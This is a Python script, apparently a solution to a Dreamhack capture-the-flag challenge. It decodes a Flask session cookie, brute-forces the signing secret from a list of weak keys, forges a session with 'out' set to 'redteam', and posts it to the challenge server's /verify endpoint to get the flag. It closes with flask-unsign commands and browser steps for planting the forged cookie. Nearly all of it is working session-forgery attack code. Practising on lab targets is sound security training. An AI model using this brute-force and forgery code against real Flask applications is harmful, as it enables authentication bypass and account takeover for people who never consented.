import requests
import base64
import json
from itsdangerous import URLSafeTimedSerializer, BadSignature

# 서버 주소
BASE_URL = "http://host8.dreamhack.games:16910"

# 현재 쿠키
current_cookie = "eyJpbml0Ijp0cnVlLCJvdXQiOiJodHRwOi8vaG9zdDguZHJlYW1oYWNrLmdhbWVzOjE2OTEwLyJ9.aUtKiQ.q2d0EG56MtfMCDmv4admWyLbz3U"

# Secret key 후보 목록 (간단한 것들)
SECRET_KEYS = [
    'secret', 'dev', 'development', 'password', '123456', 'admin',
    'flask', 'key', 'dreamhack', 'redteam', 'L', 'test', 'debug',
    'production', 'app', 'secretkey', 'mysecret', 'super-secret'
]

def decode_flask_cookie(cookie_value):
    """Flask 세션 쿠키 디코딩 (서명 검증 없이)"""
    try:
        payload = cookie_value.split('.')[0]
        decoded = base64.urlsafe_b64decode(payload + '==')
        return json.loads(decoded)
    except Exception as e:
        print(f"[!] 디코딩 실패: {e}")
        return None

def find_secret_key(cookie_value, secret_keys):
    """Secret key 브루트포스"""
    print("[*] Secret key 찾는 중...")
    
    for secret in secret_keys:
        try:
            serializer = URLSafeTimedSerializer(secret)
            result = serializer.loads(cookie_value)
            print(f"[+] Secret key 발견: '{secret}'")
            print(f"[+] 디코딩된 세션: {result}")
            return secret
        except:
            continue
    
    print("[!] Secret key를 찾지 못했습니다.")
    return None

def create_cookie(session_data, secret_key):
    """새로운 Flask 세션 쿠키 생성"""
    try:
        serializer = URLSafeTimedSerializer(secret_key)
        return serializer.dumps(session_data)
    except Exception as e:
        print(f"[!] 인코딩 실패: {e}")
        return None

def test_cookie(cookie_value):
    """생성한 쿠키로 서버 테스트"""
    session = requests.Session()
    session.cookies.set('session', cookie_value, domain='host8.dreamhack.games')
    
    try:
        # 메인 페이지 접근
        print(f"\n[*] GET / 테스트 중...")
        response = session.get(BASE_URL + "/")
        print(f"    응답 코드: {response.status_code}")
        
        # VERIFY 엔드포인트 테스트
        print(f"[*] POST /verify 테스트 중...")
        response = session.post(BASE_URL + "/verify")
        print(f"    응답 코드: {response.status_code}")
        
        # 응답 출력
        print(f"\n[*] 응답 내용:")
        print("="*60)
        print(response.text)
        print("="*60)
        
        if "flag" in response.text.lower() or "FLAG" in response.text:
            print("\n[+] FLAG 발견!")
            return True
            
    except Exception as e:
        print(f"[!] 요청 실패: {e}")
    
    return False

def main():
    print("="*60)
    print("Flask Session Cookie 조작 도구")
    print("out 값을 'redteam'으로 변경")
    print("="*60)
    
    # 1. 현재 쿠키 디코딩
    print("\n[1] 현재 쿠키 분석:")
    current_data = decode_flask_cookie(current_cookie)
    print(f"    현재 세션: {current_data}")
    
    # 2. Secret key 찾기
    print("\n[2] Secret key 브루트포스:")
    secret_key = find_secret_key(current_cookie, SECRET_KEYS)
    
    if not secret_key:
        print("\n[!] Secret key를 찾지 못했습니다.")
        print("[*] flask-unsign 도구 사용:")
        print(f"    pip install flask-unsign")
        print(f"    flask-unsign --unsign --cookie '{current_cookie}'")
        return
    
    # 3. out 값을 redteam으로 변경한 쿠키 생성
    print("\n[3] 새로운 쿠키 생성:")
    new_session = {"init": True, "out": "redteam"}
    print(f"    새로운 세션: {new_session}")
    
    new_cookie = create_cookie(new_session, secret_key)
    if not new_cookie:
        print("[!] 쿠키 생성 실패")
        return
    
    print(f"\n[+] 생성된 쿠키:")
    print(f"    {new_cookie}")
    
    # 4. 새 쿠키로 테스트
    print("\n[4] 새 쿠키로 서버 테스트:")
    test_cookie(new_cookie)
    
    print("\n[*] 완료!")
    print(f"\n[*] 브라우저에서 사용하려면:")
    print(f"    1. 개발자 도구 → Application → Cookies")
    print(f"    2. session 쿠키 값을 다음으로 변경:")
    print(f"    {new_cookie}")
    print(f"    3. 페이지 새로고침 후 VERIFY 버튼 클릭")

if __name__ == "__main__":
    main()